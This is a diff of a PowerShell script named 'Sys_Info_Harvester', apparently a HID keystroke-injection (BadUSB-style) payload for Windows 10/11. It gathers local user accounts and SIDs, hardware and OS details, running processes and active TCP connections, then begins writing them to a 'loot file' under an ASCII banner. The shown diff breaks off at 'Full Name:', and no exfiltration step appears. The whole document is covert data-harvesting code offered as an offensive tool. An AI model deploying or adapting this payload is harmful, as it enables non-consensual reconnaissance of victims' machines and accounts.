@@ -93,7 +93,7 @@ $Email = Get-Email
 
 #Local user(s) account, name, and security id:
 
-Get-WmiObject -Class Win32_UserAccount | Format-Table Domain, Name, @{N='Account';E={$PSItem.Caption}}, FullName, SID | Out-String
+$LUser = Get-WmiObject -Class Win32_UserAccount | Format-Table Domain, Name, @{N='Account';E={$PSItem.Caption}}, FullName, SID | Out-String
 
 ######################################################################################################################################################################
 
@@ -217,7 +217,7 @@ $BIOS = Get-CimInstance CIM_BIOSElement
 $OSInfo = Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
 
 #CPU Info
-Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
+$CPU = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
 
 #GPU Info
 function GPU {
@@ -238,7 +238,7 @@ $GPU = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, 
 $GPU = GPU
 
 #Mobo Info
-Get-WmiObject Win32_BaseBoard | Format-List
+$MOBO = Get-WmiObject Win32_BaseBoard | Format-List
 
 #RAM Capacity
 function RamCap {
@@ -295,11 +295,40 @@ $RunningProc = Get-WmiObject win32_process | select Handle, ProcessName, Executa
 
 ######################################################################################################################################################################
 
-#System Local Users
-Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID
+#Active TCP Connections
+$ActiveTCP = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess | Format-Table -AutoSize
 
 ######################################################################################################################################################################
 
-#Active TCP Connections
-$ActiveTCP = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess | Format-Table -AutoSize
+#Outputs to loot file
+
+$output = @"
+
+######################################################################################################################################################################
+#                                             |                                                                   |             .'''''.        ..||..'''''''...      #
+# -Title     :Sys_Info_Harvester              |                                                                   |            / ##### \       : ||            ''.   #
+# -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. #
+# -Version   :1.0                             |                                                                   |           | #  #  # |        ||             '''' &
+# -Category  :System/ User Info Grab          |       .___  __           .___                                     |            \ ##### /     /| < _>                 #
+# -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                #
+# -Mode:     :HID                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                #
+#                                             |       |   ||  |  \___ \  |   |\___ \  / __ \_/ __ \\  \___        |         .'            /   | /||                  #
+#                                             |       |___||__| /____  > |___/____  >(____  (____  /\___  >       |         '                 |/ ||                  #
+#                                             |                      \/           \/      \/     \/     \/        |         |   |     '..     |  ||                  # 
+#                                             |                                                                   |         |   |     |  '...''  ||                  #
+#_____________________________________________|___________________________________________________________________|         |  |       |         ||                  #
+#                                                                                                                 |          \ |       |         ||                  # 
+#                                                                                                                 |          |\|       |         ||                  #
+#                                                                                                                 |          \|         |        ||                  #
+#                                                                                                                 |           |         |        ||                  #
+#  -github.com/ibeihoffer                                                                                         |           |         |        ||                  #
+#  -linked.com/in/ibeihoffer                                                                                      |          |           |       ||                  #
+#                                                                                                                 |        __|           |__     ||                  #
+#                                                                                                                 |       /   '.........'   \    ||                  #
+#                                                                                                                 |        ''''''     ''''''     ##                  #
+######################################################################################################################################################################
+
+Full Name: 
+"@
+
 
